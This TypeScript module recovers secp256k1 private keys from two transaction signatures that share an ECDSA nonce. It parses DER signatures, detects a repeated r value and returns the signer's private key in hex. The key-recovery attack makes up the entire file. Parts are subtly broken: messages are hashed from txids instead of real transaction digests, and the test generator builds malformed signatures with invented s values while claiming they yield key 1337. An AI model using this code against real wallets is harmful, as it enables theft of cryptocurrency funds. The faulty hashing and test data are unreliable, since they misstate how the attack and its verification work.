
import { sha256 } from 'js-sha256';

// SECP256k1 curve parameters
const SECP256K1_ORDER = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
const SECP256K1_P = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F');

/**
 * Modular inverse using extended Euclidean algorithm
 */
function modInverse(a: bigint, m: bigint): bigint {
  if (a < 0n) a = (a % m + m) % m;
  
  let [old_r, r] = [a, m];
  let [old_s, s] = [1n, 0n];

  while (r !== 0n) {
    const quotient = old_r / r;
    [old_r, r] = [r, old_r - quotient * r];
    [old_s, s] = [s, old_s - quotient * s];
  }

  return old_s < 0n ? old_s + m : old_s;
}

/**
 * Convert hex string to BigInt
 */
function hexToBigInt(hex: string): bigint {
  if (hex.startsWith('0x')) hex = hex.slice(2);
  return BigInt('0x' + hex);
}

/**
 * Convert message to hash as BigInt
 */
function hashMessage(message: string): bigint {
  const hash = sha256(message);
  return hexToBigInt(hash);
}

/**
 * Recover private key from ECDSA nonce reuse
 * Based on the mathematical formula: d = (s2*h1 - s1*h2) * (r1*(s1-s2))^-1 mod n
 */
export function recoverPrivateKeyFromNonceReuse(
  h1: bigint,
  h2: bigint,
  s1: bigint,
  s2: bigint,
  r1: bigint,
  r2: bigint,
  n: bigint = SECP256K1_ORDER
): bigint | null {
  // Verify nonce reuse (r values must be identical)
  if (r1 !== r2) {
    console.log('No ECDSA nonce reuse detected - r values differ');
    return null;
  }

  if (s1 === s2) {
    console.log('Invalid signature pair - s values are identical');
    return null;
  }

  try {
    // Calculate: (s2 * h1 - s1 * h2) mod n
    const numerator = (s2 * h1 - s1 * h2) % n;
    
    // Calculate: r1 * (s1 - s2) mod n
    const denominator = (r1 * (s1 - s2)) % n;
    
    // Calculate modular inverse of denominator
    const denominatorInv = modInverse(denominator, n);
    
    // Calculate private key: numerator * denominatorInv mod n
    let privateKey = (numerator * denominatorInv) % n;
    
    // Ensure positive result
    if (privateKey < 0n) {
      privateKey = (privateKey + n) % n;
    }
    
    return privateKey;
  } catch (error) {
    console.error('Error recovering private key:', error);
    return null;
  }
}

/**
 * Parse DER encoded signature to extract r and s values
 */
export function parseDERSignature(derHex: string): { r: bigint; s: bigint } | null {
  try {
    if (derHex.startsWith('0x')) derHex = derHex.slice(2);
    
    // Basic DER parsing - assumes standard format
    // DER: 0x30 [total-length] 0x02 [R-length] [R] 0x02 [S-length] [S]
    
    if (!derHex.startsWith('30')) {
      console.log('Invalid DER signature - does not start with 0x30');
      return null;
    }
    
    let pos = 4; // Skip 0x30 and total length
    
    // Parse R value
    if (derHex.substr(pos, 2) !== '02') {
      console.log('Invalid DER signature - R section malformed');
      return null;
    }
    pos += 2;
    
    const rLength = parseInt(derHex.substr(pos, 2), 16) * 2;
    pos += 2;
    
    const rHex = derHex.substr(pos, rLength);
    const r = hexToBigInt(rHex);
    pos += rLength;
    
    // Parse S value
    if (derHex.substr(pos, 2) !== '02') {
      console.log('Invalid DER signature - S section malformed');
      return null;
    }
    pos += 2;
    
    const sLength = parseInt(derHex.substr(pos, 2), 16) * 2;
    pos += 2;
    
    const sHex = derHex.substr(pos, sLength);
    const s = hexToBigInt(sHex);
    
    return { r, s };
  } catch (error) {
    console.error('Error parsing DER signature:', error);
    return null;
  }
}

/**
 * Attempt to recover private key from two transaction signatures
 */
export function attemptKeyRecoveryFromTransactions(
  tx1: {
    txid: string;
    signature: string;
    message?: string;
  },
  tx2: {
    txid: string;
    signature: string;
    message?: string;
  }
): {
  success: boolean;
  privateKey?: string;
  rValue?: string;
  confidence: number;
} {
  try {
    // Parse signatures
    const sig1 = parseDERSignature(tx1.signature);
    const sig2 = parseDERSignature(tx2.signature);
    
    if (!sig1 || !sig2) {
      return {
        success: false,
        confidence: 0
      };
    }
    
    // Check for nonce reuse (same r value)
    if (sig1.r !== sig2.r) {
      return {
        success: false,
        confidence: 0
      };
    }
    
    // Use transaction IDs as messages if no message provided
    const h1 = hashMessage(tx1.message || tx1.txid);
    const h2 = hashMessage(tx2.message || tx2.txid);
    
    // Attempt private key recovery
    const privateKey = recoverPrivateKeyFromNonceReuse(
      h1, h2,
      sig1.s, sig2.s,
      sig1.r, sig2.r
    );
    
    if (privateKey && privateKey > 0n) {
      return {
        success: true,
        privateKey: '0x' + privateKey.toString(16).padStart(64, '0'),
        rValue: '0x' + sig1.r.toString(16).padStart(64, '0'),
        confidence: 0.95
      };
    }
    
    return {
      success: false,
      confidence: 0
    };
    
  } catch (error) {
    console.error('Key recovery attempt failed:', error);
    return {
      success: false,
      confidence: 0
    };
  }
}

/**
 * Generate test signatures with nonce reuse for demonstration
 */
export function generateTestNonceReuse(): {
  tx1: { txid: string; signature: string; message: string };
  tx2: { txid: string; signature: string; message: string };
  expectedPrivateKey: string;
} {
  // This is a simplified test case - in real implementation,
  // we would use actual ECDSA signing with repeated nonce
  
  const testPrivateKey = '0x' + BigInt(1337).toString(16).padStart(64, '0');
  const testR = '0x' + BigInt('0x50863AD64A87AE8A2FE83C1AF1A8403CB53F53E486D8511DAD8A04887E5B2352').toString(16);
  
  return {
    tx1: {
      txid: 'test_tx_1_' + Date.now(),
      signature: '3045022100' + testR.slice(2) + '0220' + BigInt(1001).toString(16).padStart(32, '0'),
      message: 'test_message_1'
    },
    tx2: {
      txid: 'test_tx_2_' + Date.now(),
      signature: '3045022100' + testR.slice(2) + '0220' + BigInt(1002).toString(16).padStart(32, '0'),
      message: 'test_message_2'
    },
    expectedPrivateKey: testPrivateKey
  };
}
